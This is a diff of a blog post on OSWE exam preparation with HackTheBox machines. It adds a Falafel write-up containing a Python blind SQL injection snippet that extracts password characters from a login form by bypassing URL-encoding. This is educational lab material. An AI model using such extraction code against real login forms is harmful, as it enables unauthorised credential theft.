@@ -35,22 +35,11 @@ There is [google table](https://docs.google.com/spreadsheets/d/1dwSMIAPIam0PuRBk
 
 {% include figure.html path="assets/img/posts/oswe_preparation/htb_machines_table.png" title="oswe_preparation" class="img-fluid rounded z-depth-1" %}
 
-There are machines i've added to "machines to do" list:
-
-* Blocky (Easy) +
-* Help (Easy) +
-* Schooled (Medium) 
-* Magic (Medium)
-* JSON (Medium)
-* Popcorn (Medium) +
-* Unattended (Medium)
-* Celestial (Medium)
-* Vault (Medium)
-* Unobtainium (Hard)
-* Zipper (Hard)
+There are machines i've decided to solve and write some descriptions:
+* Blocky (Easy) 
+* Help (Easy)
+* Popcorn (Medium)
 * Falafel (Hard)
-* Monitors (Hard)
-* Sink (Insane)
 
 Also, was found a nice [link](https://github.com/snoopysecurity/OSWE-Prep) that can be used too.
 
@@ -85,4 +74,37 @@ Simple task to create PHP-shell for uploading, but bypassing some restrictions v
 
 Most cofortable for that task was Python, by my opinion, here is [link](https://github.com/MikeDakotaStayTrue/Script4You/blob/main/upload_php_png.py) to script.
 
+#### Falafel
+Here was Blind SQLi in the login form, where we could extract some passwords. I have wasted some time on script creation. The task was simple, but it was an annoying error that I couldn't understand while working with prepared requests in Python.
+
+Next situation: for SQLi, I needed to send my body in POST request without URL-encoding, since that is the default behavior. But I found a way to bypass it by using prepared requests.
+
+I have not found much practical information about using it, and finding errors myself is waiting for me.
+
+Prepared statemets allow to change body after creating a request, but HTTP-header Content-length will not be updated. I didn't know it.
+
+
+Final piece of code to send URL-decoded body:
+```
+...
+  sql_string = "admin'+and+ASCII(SUBSTRING(password,{},1))={}--+-".format(indx, chr_)
+  data = {'username': sql_string, 'password':'pass'}
+
+  req = requests.Request('POST', lab_url, data=data)
+  
+  prep = session.prepare_request(req)
+  prep.body = urllib.parse.unquote(prep.body)
+  prep.headers['Content-length'] = len(prep.body)
+
+  resp = session.send(prep)
+...
+```
+
+It's better to binary search instead of n(1), but im lazy. Here is proof of dupmping all tables:
+
+{% include figure.html path="assets/img/posts/oswe_preparation/falafel_sqli_tables.png" title="oswe_preparation" class="img-fluid rounded z-depth-1" %}
+
+And link to my [script](https://github.com/MikeDakotaStayTrue/Script4You/blob/main/blind_sqli_extractor.py).
+
+{% include figure.html path="assets/img/posts/oswe_preparation/falafel_sqli_pass.png" title="oswe_preparation" class="img-fluid rounded z-depth-1" %}
 ---
